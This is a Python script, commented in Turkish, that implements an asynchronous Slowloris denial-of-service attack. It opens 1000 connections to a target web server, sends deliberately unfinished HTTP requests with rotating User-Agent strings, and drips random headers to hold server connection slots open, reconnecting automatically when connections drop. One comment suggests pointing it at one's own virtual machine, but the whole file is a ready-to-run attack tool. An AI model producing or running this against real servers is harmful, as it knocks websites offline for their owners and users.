import asyncio
import random
import socket
import sys

# Test edilecek hedef sanal makinenin IP adresi ve portu
hedef_ip = "x"  # Kendi sanal makinenizin IP'si ile değiştirin
hedef_port = 80
baglanti_sayisi = 1000        # Açılacak sahte bağlantı miktarı

# Sunucuyu yanıltacak rastgele HTTP başlıkları (User-Agent)
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
]

aktif_soket_sayisi = 0

async def slowloris_connection(connection_id):
    global aktif_soket_sayisi
    while True:
        connected = False
        try:
            # Asenkron TCP bağlantısı kurma
            reader, writer = await asyncio.open_connection(hedef_ip, hedef_port)
            
            # Soket seçeneklerini özelleştirme (TCP Keep-Alive ve No Delay)
            sock = writer.get_extra_info('socket')
            if sock:
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
                sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            
            # Eksik HTTP isteği gönderme (\r\n\r\n ile BİTİRİLMEYEN istek)
            writer.write(f"GET /?{random.randint(0, 2000)} HTTP/1.1\r\n".encode("utf-8"))
            writer.write(f"User-Agent: {random.choice(user_agents)}\r\n".encode("utf-8"))
            writer.write("Accept-language: en-US,en;q=0.5\r\n".encode("utf-8"))
            await writer.drain()
            
            connected = True
            aktif_soket_sayisi += 1
            print(f"[+] Soket {connection_id} başarıyla açıldı.")
            
            # Canlı tutma döngüsü
            while True:
                # Sunucunun timeout süresine yakalanmamak için rastgele 5 ila 10 saniye aralığında beklenir
                await asyncio.sleep(random.randint(5, 10))
                # Zaman aşımını (Timeout) engellemek için anlamsız ama geçerli bir ek başlık gönderilir
                header_name = f"X-{random.choice(['a', 'b', 'c', 'd', 'y', 'z'])}"
                writer.write(f"{header_name}: {random.randint(1, 5000)}\r\n".encode("utf-8"))
                await writer.drain()
                
        except (asyncio.CancelledError, SystemExit):
            if connected:
                aktif_soket_sayisi -= 1
            break
        except Exception as e:
            if connected:
                aktif_soket_sayisi -= 1
            print(f"[-] Soket {connection_id} bağlantısı koptu veya açılamadı: {e}. Yeniden bağlanıyor...")
            await asyncio.sleep(1) # Yeniden bağlanmayı denemeden önce 1 saniye bekle

async def status_monitor():
    while True:
        await asyncio.sleep(5)
        print(f"[*] Canlı tutma sinyalleri gönderiliyor... Aktif Soket Sayısı: {aktif_soket_sayisi}")

async def main():
    print(f"[*] {hedef_ip} adresine {baglanti_sayisi} adet yavaş bağlantı açılıyor (Asenkron)...")
    
    # Durum izleme görevini arka planda başlat
    monitor_task = asyncio.create_task(status_monitor())
    
    tasks = []
    for i in range(baglanti_sayisi):
        tasks.append(asyncio.create_task(slowloris_connection(i + 1)))
        # Soketlerin hepsinin aynı milisaniyede yüklenmesini önlemek ve kaynak tüketimini dengelemek için kısa bir ara verilir
        await asyncio.sleep(0.02)
        
    try:
        await asyncio.gather(*tasks)
    except KeyboardInterrupt:
        pass
    finally:
        monitor_task.cancel()

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n[*] Program kullanıcı tarafından durduruldu.")
